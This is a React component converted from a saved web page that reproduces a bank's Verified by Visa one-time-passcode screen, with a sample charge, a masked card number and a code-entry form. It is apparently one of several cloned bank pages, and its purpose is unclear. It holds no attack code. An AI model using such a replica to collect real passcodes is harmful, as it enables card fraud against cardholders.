// @ts-nocheck - HTML-to-JSX conversion; some attributes need manual fixes
import React from "react";
import NBD2Styles from "./styles/nbd2-styles";

export function NBD2(props: Record<string, unknown>) {
  return (
    <div>
      {/*[if lte IE 8]><html class="lt-ie9" lang=""><![endif]*/}{/*[if IE 9]><html class="lt-ie10" lang=""><![endif]*/}{/*[if gt IE 9]><html lang=""><![endif]*/}<meta charSet="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>Validate Authentication Credential</title>
     <NBD2Styles />
      <div className="threeds-two">
        <div className="container-fluid">
          <div className="visa-styling header" id="HeaderLogosFullWidth">
            <button className="closeModal" id="ExitLink">X</button>
            <div className="row no-pad">
              <div className="visa-styling bottom-border col-12">
                <div className="pull-left visa-header-one">
                  <img alt="Bank Logo" className="visa-header-img" src="/bank-images/NBD2/image-1.png" />
                </div>
                <div className="pull-right visa-header-two">
                  <img alt="Verified By Visa logo" className="visa-header-img" src="/bank-images/NBD2/image-2.svg" />
                </div>
              </div>
            </div>
          </div>
          <div className="visa-styling body" dir="ltr">
            <div className="visa-styling container container-sticky-footer">
              <h2 className="screenreader-only">Your One-time Passcode has been sent</h2>
              <div className="visa-row">
                <div className="visa-col-12 visa-validate">
                  <strong>Payment Authentication</strong>
                </div>
                <div className="row">
                  <div className="col-12" id="ValidateOneUpMessage">
                    <p className="mb-0" id="Body1">We just sent a SMS with secure code to your registered mobile number.<br /><br />You are authorizing a payment to <span id="contentBlock-merchantname">eand UAE eShop</span> for <span id="contentBlock-amount" className="always-left-to-right">Dhs. 20.00 AED</span> on 11/12/2025 with your card ending with <span id="contentBlock-maskedpan" className="always-left-to-right">************4522</span>.</p>
                  </div>
                </div>
              </div>
              <form action="/Api/2_1_0/NextStep/ValidateCredential" autoComplete="off" data-ajax="true" data-ajax-begin="ccHelpers.ajax.onBegin" data-ajax-complete="ccHelpers.ajax.onComplete" data-ajax-failure="ccHelpers.ajax.onFailure" data-ajax-method="form" data-ajax-success="ccHelpers.ajax.onSuccess" id="ValidateCredentialForm" method="post" name="ValidateCredentialForm" noValidate> 
                <div className="visa-row">
                  <div className="col-12 visa-styling">
                    <div className="form-group text-center">
                      <div id="InputAction">
                        <label htmlFor="CredentialValidateInput">Verification Code</label>
                        <input autofocus className="form-control visa-styling" data-val="true" data-val-required="Please enter the code" id="CredentialValidateInput" name="Credential.Value" type="text" defaultValue />
                        <div className="form-group" id="ErrorMessage">
                          <img id="WarningImage" src="data:," alt="Warning" style={{display: 'none'}} />
                          <span id="ValidationErrorMessage" className="field-validation-error" style={{display: 'none'}} />
                          <span className="field-validation-valid sf-hidden" data-valmsg-for="Credential.Value" data-valmsg-replace="true" />
                        </div>
                        <div className="visa-col-12 text-center">
                          <button type="submit" className="visa-styling btn btn-primary text-uppercase vba-button" id="ValidateButton">Submit</button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div className="visa-row">
                </div>
                <div className="visa-row">
                  <div className="col-12 text-center">
                    <span style={{display: 'none'}} id="MaximumResendsReachedMessage">You have been reached maximum attempts, Please contact bank</span>
                    <button id="ResendLink" className="btn btn-link resend-link no-decoration text-uppercase">RESEND CODE</button>
                  </div>
                </div>
                <div className="footer" id="FooterLinks">
                  <div className="row">
                    <div className="visa-col-12 helpRow" id="Accordion">
                      <ul className="list-group list-group-horizontal flex-wrap pull-left"><li className="list-group-item border-0"><a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">Need some help?</a></li><li className="list-group-item border-0"><a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">learn more about authentication</a></li></ul>
                    </div>
                  </div>
                </div></form></div>
            <div className="modal modal-clear sf-hidden" id="ProcessingModal" tabIndex={-1} role="dialog" aria-labelledby="Processing-label" aria-hidden="true" data-keyboard="false" data-backdrop="static" aria-modal="true">
            </div>
            <form action="/Api/2_1_0/NextStep/StepUp" autoComplete="off" data-ajax="true" data-ajax-begin="ccHelpers.ajax.onBegin" data-ajax-complete="ccHelpers.ajax.onComplete" data-ajax-failure="ccHelpers.ajax.onFailure" data-ajax-method="form" data-ajax-success="ccHelpers.ajax.onSuccess" id="StepupForm" method="post" name="StepupForm" />
          </div>
          <div className="modal fade sf-hidden" id="FAQ" tabIndex={-1} role="dialog" aria-labelledby="FAQ-label" data-bs-backdrop="static" data-bs-keyboard="false" aria-modal="true">
          </div><div className="modal fade sf-hidden" id="Terms" tabIndex={-1} role="dialog" aria-labelledby="Terms-label" data-bs-backdrop="static" data-bs-keyboard="false" aria-modal="true">
          </div>
          <form className="nextstep-form" method="post">
          </form>
          <form method="POST" id="TermForm">
          </form>
        </div>
      </div>
    </div>
    
  );
}
